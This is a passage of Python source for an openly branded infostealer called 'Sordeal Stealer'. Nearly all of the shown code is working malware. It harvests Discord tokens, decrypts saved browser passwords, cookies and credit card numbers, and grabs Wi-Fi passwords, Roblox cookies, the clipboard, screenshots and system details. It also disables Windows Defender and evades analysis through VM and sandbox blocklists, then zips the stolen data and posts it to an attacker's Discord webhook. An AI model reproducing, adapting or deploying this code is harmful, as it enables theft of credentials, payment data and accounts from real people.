                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.disc_url_api,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.SO_id:
                                    self.tokens.append(token)
                                    self.SO_id.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(
                    self.roaming + "\\Mozilla\\Firefox\\Profiles"
            ):
                for _file in files:
                    if not _file.endswith(".sqlite"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.disc_url_api,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.SO_id:
                                    self.tokens.append(token)
                                    self.SO_id.append(uid)

    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
        filname = "".join(
            random.SystemRandom().choice(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            )
            for _ in range(random.randint(10, 20))
        )
        path = ntpath.join(_dir, filname)
        open(path, "x")
        return path

    @extract_try
    def so_stol_passwords2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers != "yes":
            return

        path = os.path.join(path, profile, "Login Data")
        if not os.path.isfile(path):
            return

        loginvault = self.random_dir_create()
        try:
            copy2(path, loginvault)
            conn = sqlite3.connect(loginvault)
            cursor = conn.cursor()
            with open(os.path.join(self.dir, "Browsers", "Browsers Passwords.txt"), "a", encoding="utf-8") as f:
                for url, username, password in cursor.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if url:
                        password = self.value_decrypt(password, self.masterkey)
                        f.write(
                            f"URL: {url}\nID: {username}\nSordeal  Password: {password}\n\n")
                        self.thingstocount['Pssw'] += len(password)
            cursor.close()
        finally:
            conn.close()
            os.remove(loginvault)

    @extract_try
    def so_stol_cookies2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers != "yes":
            return

        path = os.path.join(path, profile, "Network", "Cookies")
        if not os.path.isfile(path):
            return

        cookievault = self.random_dir_create()
        shutil.copy2(path, cookievault)

        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()

        with open(
            os.path.join(self.dir, "Browsers", "Browsers Cookies.txt"),
            "a",
            encoding="utf-8",
        ) as f:
            for res in cursor.execute(
                "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
            ).fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.value_decrypt(encrypted_value, self.masterkey)
                if host_key and name and value:
                    f.write(
                        f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n"
                    )

        cursor.close()
        conn.close()

        os.remove(cookievault)
        self.thingstocount['Cooks'] += len(host_key)

    @extract_try
    def so_stol_passwords(self):
        if self.ineedtogetbrowsers != "yes":
            return

        with open(ntpath.join(self.dir, "Google", "Passwords.txt"), "w", encoding="cp437", errors="ignore") as f:
            for prof in os.listdir(self.chrmmuserdtt):
                if re.match(self.chrmrgx, prof):
                    login_db = ntpath.join(
                        self.chrmmuserdtt, prof, "Login Data")
                    login = self.files_creating()
                    shutil.copy2(login_db, login)

                    with sqlite3.connect(login) as conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT origin_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url, username, encrypted_password = r
                            decrypted_password = self.value_decrypt(
                                encrypted_password, self.chrome_key)
                            if url:
                                f.write(
                                    f"URL: {url}\nID: {username}\nSordeal  Password: {decrypted_password}\n\n")
                                self.thingstocount['Pssw'] += len(
                                    decrypted_password)

                    os.remove(login)

    @extract_try
    def so_stol_cookies(self):
        if self.ineedtogetbrowsers != "yes":
            return

        with open(ntpath.join(self.dir, "Google", "Cookies.txt"), "w", encoding="cp437", errors="ignore") as f:
            for prof in os.listdir(self.chrmmuserdtt):
                if re.match(self.chrmrgx, prof):
                    login_db = ntpath.join(
                        self.chrmmuserdtt, prof, "Network", "cookies")
                    login = self.files_creating()

                    shutil.copy2(login_db, login)
                    conn = sqlite3.connect(login)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT host_key, name, encrypted_value from cookies")

                    for r in cursor.fetchall():
                        host, user, encrypted_value = r
                        decrypted_cookie = self.value_decrypt(
                            encrypted_value, self.chrome_key)
                        if host != "":
                            f.write(
                                f"{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{decrypted_cookie}\n")

                        if "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in decrypted_cookie:
                            self.robloxcookies.append(decrypted_cookie)

                        self.thingstocount['Cooks'] += len(decrypted_cookie)
                        self.thingstocount['Rblx_Cooks'] += len(
                            self.robloxcookies)

                    cursor.close()
                    conn.close()
                    os.remove(login)
            f.close()

    def so_stol_history2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers != "yes":
            return

        path = os.path.join(path, profile, "History")
        if not os.path.isfile(path):
            return

        historyvault = self.random_dir_create()
        shutil.copy2(path, historyvault)

        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()

        with open(
            os.path.join(self.dir, "Browsers", "Browsers History.txt"),
            "a",
            encoding="utf-8",
        ) as f:
            sites = []
            for res in cursor.execute(
                "SELECT url, title, visit_count, last_visit_time FROM urls WHERE url IS NOT NULL AND title IS NOT NULL AND visit_count IS NOT NULL AND last_visit_time IS NOT NULL"
            ).fetchall():
                sites.append(res)

            sites.sort(key=lambda x: x[3], reverse=True)
            self.thingstocount['Hist'] += len(sites)

            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                    site[2], site[1]))

        cursor.close()
        conn.close()
        os.remove(historyvault)

    def so_stol_cc2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers != "yes":
            return

        path += "\\" + profile + "\\Web Data"
        if not os.path.isfile(path):
            return
        cc_vaults = self.random_dir_create()
        copy2(path, cc_vaults)
        with sqlite3.connect(cc_vaults) as conn:
            conn.row_factory = sqlite3.Row
            with conn.cursor() as cursor:
                cursor.execute(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards WHERE name_on_card != '' AND card_number_encrypted != ''"
                )
                with open(ntpath.join(self.dir, "Browsers", "Browsers CC.txt"), "a", encoding="utf-8") as f:
                    for res in cursor.fetchall():
                        name_on_cc, expir_on_cc, expir_year_cc, number_onmy_cc = res
                        f.write(
                            f"Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n"
                        )
                        self.thingstocount['CC'] += len(name_on_cc)
        os.remove(cc_vaults)

    @extract_try
    def so_stol_history(self):
        if self.ineedtogetbrowsers != "yes":
            return

        with open(ntpath.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
            def SO_pleaseexctract(db_cursor):
                db_cursor.execute(
                    "SELECT title, url, last_visit_time FROM urls")
                for item in db_cursor.fetchall():
                    yield f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.time_convertion(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"

            def exctract_websearch_bc(db_cursor):
                db_cursor.execute("SELECT term FROM keyword_search_terms")
                for item in db_cursor.fetchall():
                    if item[0] != "":
                        yield item[0]

            for prof in os.listdir(self.chrmmuserdtt):
                if not re.match(self.chrmrgx, prof):
                    continue

                login_db = ntpath.join(self.chrmmuserdtt, prof, "History")
                login = self.files_creating()

                shutil.copy2(login_db, login)
                with sqlite3.connect(login) as conn:
                    cursor = conn.cursor()

                    search_history = exctract_websearch_bc(cursor)
                    web_history = SO_pleaseexctract(cursor)

                    f.write(
                        f"{' ' * 17}SORDEAL SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}"
                    )

                    self.thingstocount['Hist'] += sum(
                        1 for _ in search_history)
                    self.thingstocount['Hist'] += sum(1 for _ in web_history)
                    cursor.close()
                    os.remove(login)

    def natify_matched_tokens(self):
        with open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors="ignore") as f:
            for token in self.tokens:
                headers = self.header_making(token)
                j = httpx.get(self.disc_url_api, headers=headers).json()
                user = f"{j['username']}#{j['discriminator']}"
                flags = j.get("flags", 0)
                badge_flags = {
                    1: "Staff",
                    2: "Partner",
                    4: "Hypesquad Event",
                    8: "Green Bughunter",
                    64: "Hypesquad Bravery",
                    128: "Hypesquad Brilliance",
                    256: "Hypesquad Balance",
                    512: "Early Supporter",
                    16384: "Gold BugHunter",
                    131072: "Verified Bot Developer",
                    4194304: "Active Developer",
                }
                badges = [badge_flags[f] for f in badge_flags if flags & f]
                if not badges:
                    badges = ["None"]
                email = j.get("email", "No Email attached")
                phone = j.get("phone", "No Phone Number attached")
                nitro_data = httpx.get(
                    self.disc_url_api + "/billing/subscriptions", headers=headers
                ).json()
                has_nitro = bool(nitro_data)
                payment_sources = json.loads(
                    httpx.get(
                        self.disc_url_api + "/billing/payment-sources", headers=headers
                    ).text
                )
                billing = bool(payment_sources)
                f.write(
                    f"{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
                )
                self.thingstocount['Disco_info'] += 1

    def mc_find(self) -> None:
        if self.ineedtogetmc != "yes":
            return

        mcdir = ntpath.join(self.roaming, ".minecraft")
        if not os.path.exists(mcdir) or not os.path.isfile(ntpath.join(mcdir, "launcher_profiles.json")):
            return

        os.makedirs(pathtoget := ntpath.join(
            self.dir, "Minecraft"), exist_ok=True)
        count = 0
        for i in os.listdir(mcdir):
            if i.endswith((".json", ".txt", ".dat")):
                shutil.copy2(ntpath.join(mcdir, i), ntpath.join(pathtoget, i))
                count += 1

        self.thingstocount["Minecraft"] += count

    def getmyclipboard(self):
        if self.ineedtogetclipboard != "yes":
            return
        output = Functions.so_findClipboard()
        if output:
            with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write(
                    "Sordeal | https://github.com/Sordeal/Sordeal-Stealer\n\n" + output)

    def so_please_getmyAV(self):
        if self.ineedtogetav != "yes":
            return
        cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName'
        with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) as proc:
            output, error = proc.communicate()
            if proc.returncode != 0:
                print(f"Error: {error}")
                return
            output_lines = output.strip().split("\n")
            if len(output_lines) < 2:
                return
            av_list = output_lines[1:]
            av_path = os.path.join(self.dir, "Systeme", "Anti Virus.txt")
            with open(av_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write("\n".join(av_list))

    def so_please_disabledefender(self):
        if self.disablemydefender != "yes":
            return

        try:
            subprocess.run(self.command_disable, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error disabling Windows Defender: {e}")
            pass

    @extract_try
    def getmywifiSordeal(self):
        if self.ineedtogetwifipassword != "yes":
            return

        passwords = Functions.so_findwifi()
        profiles = [
            f'SSID: {ssid}\nSordeal  Password: {password}' for ssid, password in passwords.items()]
        divider = '\n\nSordeal | https://github.com/Sordeal/Sordeal-Stealer\n\n'

        with open(ntpath.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
            file.write(divider + divider.join(profiles))

        self.thingstocount['Wifi'] += len(profiles)

    def find_roblox(self):
        if self.ineedtogetrblx != "yes":
            return

        def subproc(path):
            try:
                return (
                    subprocess.check_output(
                        rf"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                        creationflags=0x08000000,
                    )
                    .decode()
                    .rstrip()
                )
            except Exception:
                return None

        reg_cookie = subproc(r"HKLM") or subproc(r"HKCU")
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(ntpath.join(self.dir, "Roblox", "Roblox_Cookies.txt"), "w") as f:
                f.write("\n".join(self.robloxcookies))

    def screentimes(self):
        if self.ineedtogetscreen != "yes":
            return

        with ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None) as image:
            image.save(self.dir + "\\Systeme\\Screenshot.png")

        self.thingstocount['Screenshots'] += 1

    def system_informations(self):
        if self.ineedtogetsys != "yes":
            return
        about = [
            f"{login_info} | {computer_victim}",
            f"Windows key: {self.key_windows_find}",
            f"Windows version: {self.never_wind}",
            f"RAM: {fast_memory_storage}GB",
            f"DISK: {storage_space}GB",
            f"HWID: {self.windows_uuid}",
            f"IP: {self.ip}",
            f"City: {self.city}",
            f"Country: {self.country}",
            f"Region: {self.region}",
            f"Org: {self.org}",
            f"GoogleMaps: {self.googlemap}"
        ]
        with open(ntpath.join(self.dir, 'Systeme', 'System_Info.txt'), 'w', encoding='utf-8', errors='ignore') as f:
            f.write('\n'.join(about))

    def finished_bc(self):
        for i in os.listdir(self.dir):
            if i.endswith(".txt"):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "SORDEAL Create By SHAMAN SOVIETIC | https://github.com/Sordeal\n\n"
                            )
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x
                                + "\n\nSORDEAL Create By SHAMAN SOVIETIC | https://github.com/Sordeal"
                            )
        _zipfile = ntpath.join(
            self.appdata, f"{self.getlange(self.code_winpc)}SORDEAL_[{login_info}].zip")
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        path_src = ntpath.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = ntpath.abspath(ntpath.join(dirname, filename))
                arcname = absname[len(path_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        file_count, files_found, tokens = 0, "", ""
        for _, __, files in os.walk(self.dir):
            for _file in files:
                files_found += f"- {_file}\n"
                file_count += 1
        for tkn in self.tokens:
            tokens += f"{tkn}\n\n"
        fileCount = f"{file_count} SORDEALISED FILES: "
        embed = {
            "username": "Sordeal",
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "embeds": [
                {
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "color": 16711718,
                    "description": f"[SORDEAL ON TOP]({self.googlemap})",
                    "fields": [
                        {
                            "name": "\u200b",
                            "value": f"""```ansi
[2;40m[2;47m[2;42m[2;41m[2;45mIP:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.ip if self.ip else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mOrg:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.org if self.org else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mCity:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.city if self.city else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mRegion:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.region if self.region else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mCountry:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.country if self.country else "N/A"}[0m[2;34m[0m
```
                            """.replace(
                                " ", " "
                            ),
                            "inline": False,
                        },
                        {
                            "name": "\u200b",
                            "value": f"""```markdown
                                # Computer Name: {computer_victim.replace(" ", " ")}
                                # Windows Key: {self.key_windows_find.replace(" ", " ")}
                                # Windows Ver: {self.never_wind.replace(" ", " ")}
                                # Ram Stockage: {fast_memory_storage}GB
                                # Disk Stockage: {storage_space}GB
                                # Total Disk Storage: {self.total_gb:.2f}GB
                                # Used {self.used_gb:.2f}GB
                                # Free: {self.free_gb:.2f}GB
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": True,
                        },
                        {
                            "name": "\u200b",
                            "value": f"""```markdown
                                # Cookies Found: {self.thingstocount['Cooks']}
                                # Passwords Found: {self.thingstocount['Pssw']}
                                # Credit Card Found: {self.thingstocount['CC']}
                                # History Found: {self.thingstocount['Hist']}
                                # Discord Tokens Found: {self.thingstocount['Disco_info']}
                                # Roblox Cookies Found: {self.thingstocount['Rblx_Cooks']}
                                # Minecraft Tokens Found: {self.thingstocount['Minecraft']}
                                # Wifi Passwords Found: {self.thingstocount['Wifi']}
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": True,
                        },
                        {
                            "name": fileCount,
                            "value": f"""```ansi
                            [2;37m[2;30m[2;34mDisk Used at:
                            [2;31m[0m[2;34m[2;31m{self.progress_bar} {self.used_percent:.2f}%[0m[2;34m[0m[2;30m[0m[2;37m[0m
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": False,
                        },
                        {
                            "name": fileCount,
                            "value": f"""```markdown
                                {files_found.strip().replace("_", ' ')}
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": False,
                        },
                        {
                            "name": "**- Valid Tokens Found:**",
                            "value": f"""```yaml
{tokens if tokens else "tokens not found"}```
                            """.replace(
                                " ", ""
                            ),
                            "inline": False,
                        },

                    ],
                    "footer": {
                        "text": "SORDEAL Create BY SHAMAN・https://github.com/Sordeal"
                    },
                }
            ],
        }

        with open(_zipfile, "rb") as f:
            if self.find_myreg_web in self.thiswebhooknotencrypt:
                httpx.post(self.thiswebhooknotencrypt, json=embed)
                httpx.post(self.thiswebhooknotencrypt,
                           files={"upload_file": f})
        os.remove(_zipfile)


class NoDebugg(Functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        self.users_blocked = [
            "WDAGUtilityAccount",
            "BvJChRPnsxn",
            "Harry Johnson",
            "SqgFOf3G",
            "RGzcBUyrznReg",
            "h7dk1xPr",
            "Robert",
            "Abby",
            "Peter Wilson",
            "hmarc",
            "patex",
            "JOHN-PC",
            "RDhJ0CNFevzX",
            "kEecfMwgj",
            "Frank",
            "8Nl0ColNQ5bq",
            "Lisa",
            "John",
            "george",
            "PxmdUOpVyx",
            "8VizSM",
            "w0fjuOVmCcP5A",
            "lmVwjj9b",
            "PqONjHVwexsS",
            "3u2v9m8",
            "Julia",
            "HEUeRzl",
        ]
        self.pcname_blocked = [
            "DESKTOP-CDLNVOQ",
            "BEE7370C-8C0C-4",
            "DESKTOP-NAKFFMT",
            "WIN-5E07COS9ALR",
            "B30F0242-1C6A-4",
            "DESKTOP-VRSQLAG",
            "Q9IATRKPRH",
            "XC64ZB",
            "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET",
            "SERVER1",
            "LISA-PC",
            "JOHN-PC",
            "DESKTOP-B0T93D6",
            "DESKTOP-1PYKP29",
            "DESKTOP-1Y2433R",
            "WILEYPC",
            "WORK",
            "6C4E733F-C2D9-4",
            "RALPHS-PC",
            "DESKTOP-WG3MYJS",
            "DESKTOP-7XC6GEZ",
            "DESKTOP-5OV9S0O",
            "QarZhrdBpj",
            "ORELEEPC",
            "ARCHIBALDPC",
            "JULIA-PC",
            "d1bnJkfVlH",
            "DESKTOP-B0T93D6",
        ]
        self.hwid_blocked = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016",
            "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A",
            "00000000-0000-0000-0000-AC1F6BD04972",
            "79AF5279-16CF-4094-9758-F88A616D81B4",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439",
            "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7",
            "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
            "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0",
            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
            "BB64E044-87BA-C847-BC0A-C797D1A16A50",
            "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
            "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
        ]
        self.ips_blocked = [
            "88.132.231.71",
            "78.139.8.50",
            "20.99.160.173",
            "88.153.199.169",
            "84.147.62.12",
            "194.154.78.160",
            "92.211.109.160",
            "195.74.76.222",
            "188.105.91.116",
            "34.105.183.68",
            "92.211.55.199",
            "79.104.209.33",
            "95.25.204.90",
            "34.145.89.174",
            "109.74.154.90",
            "109.145.173.169",
            "34.141.146.114",
            "212.119.227.151",
            "195.239.51.59",
            "192.40.57.234",
            "64.124.12.162",
            "34.142.74.220",
            "188.105.91.173",
            "109.74.154.91",
            "34.105.72.241",
            "109.74.154.92",
            "213.33.142.50",
            "109.74.154.91",
            "93.216.75.209",
            "192.87.28.103",
            "88.132.226.203",
            "195.181.175.105",
            "88.132.225.100",
            "92.211.192.144",
            "34.83.46.130",
            "188.105.91.143",
            "34.85.243.241",
            "34.141.245.25",
            "178.239.165.70",
            "84.147.54.113",
            "193.128.114.45",
            "95.25.81.24",
            "92.211.52.62",
            "88.132.227.238",
            "35.199.6.13",
            "80.211.0.97",
            "34.85.253.170",
            "23.128.248.46",
            "35.229.69.227",
            "34.138.96.23",
            "192.211.110.74",
            "35.237.47.12",
            "87.166.50.213",
            "34.253.248.228",
            "212.119.227.167",
            "193.225.193.201",
            "34.145.195.58",
            "34.105.0.27",
            "195.239.51.3",
            "35.192.93.107",
        ]

        for func in [self.last_check, self.keys_regex, self.Check_and_Spec]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def last_check(self):
        blocked_paths = [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]
        blocked_users = set(self.users_blocked)
        blocked_pcnames = set(self.pcname_blocked)
        blocked_ips = set(self.ips_blocked)
        blocked_hwids = set(self.hwid_blocked)

        if any(ntpath.exists(path) for path in blocked_paths):
            self.programExit()
        if login_info in blocked_users:
            self.programExit()
        if computer_victim in blocked_pcnames:
            self.programExit()
        if self.info_netword()[0] in blocked_ips:
            self.programExit()
        if self.info_sys()[0] in blocked_hwids:
            self.programExit()

    def Check_and_Spec(self):
        fast_memory_storage = int(fast_memory_storage)
        storage_space = int(storage_space)
        cpu_count = psutil.cpu_count()
        if fast_memory_storage <= 2 or storage_space <= 100 or cpu_count <= 1:
            self.programExit()

    def keys_regex(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if (reg1 and reg2) != 1:
            self.programExit()
        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":
    asyncio.run(first_function_bc().init())
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
Threadlist = []


def find_in_config(e: str) -> str or bool | None:
    return __config__.get(e)


hooks = f'{base64.b64decode(find_in_config("SO_webhook"))}'.replace(
    "b'", "").replace("'", "")
hook = str(hooks)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(
            byref(blob_in), None, byref(
                blob_entropy), None, None, 0x01, byref(blob_out)
    ):
        return GetData(blob_out)


def Value_Dcryptage(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts == "v10" or starts == "v11":
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def Requests_loading(methode, url, data="", files="", headers=""):
    for i in range(8):
        try:
            if methode == "POST":
                if data != "":
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != "":
                    r = requests.post(url, files=files)
                    if (
                            r.status_code == 200 or r.status_code == 413
                    ):  # 413 = DATA TO BIG
                        return r
        except:
            pass


def URL_librairy_Loading(hook, data="", files="", headers=""):
    for i in range(8):
        try:
            if headers != "":
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def Trust(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED


def Reformat(listt):
    e = re.findall("(\w+[a-z])", listt)
    while "https" in e:
        e.remove("https")
    while "com" in e:
        e.remove("com")
    while "net" in e:
        e.remove("net")
    return list(set(e))


def upload(name, tk=""):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    if name == "sopleasecheck_files":
        data = {
            "content": "",

            "embeds": [
                {
                    "fields": [
                        {"name": "Interesting files found on user PC:", "value": tk}
                    ],
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "footer": {"text": "github.com/SORDEAL"},
                    "color": 16711718,
                }
            ],
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "username": "Sordeal - Stealer",
            "attachments": [],
        }
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
        return
    path = name
    files = {"file": open(path, "rb")}

    if "SO_allpasswords" in name:
        ra = " | ".join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = " | ".join(da for da in rrr)
        data = {
            "content": "",
            "embeds": [
                {
                    "fields": [{"name": "Passwords Found:", "value": ra}],
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "footer": {
                        "text": "github.com/SORDEAL",
                    },
                    "color": 16711718,
                }
            ],
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "username": "Sordeal - Stealer",
            "attachments": [],
        }
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
    if "SO_allcookies" in name:
        rb = " | ".join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = " | ".join(da for da in rrrrr)
        data = {
            "content": "",
            "embeds": [
                {
                    "fields": [{"name": "Cookies Found:", "value": rb}],
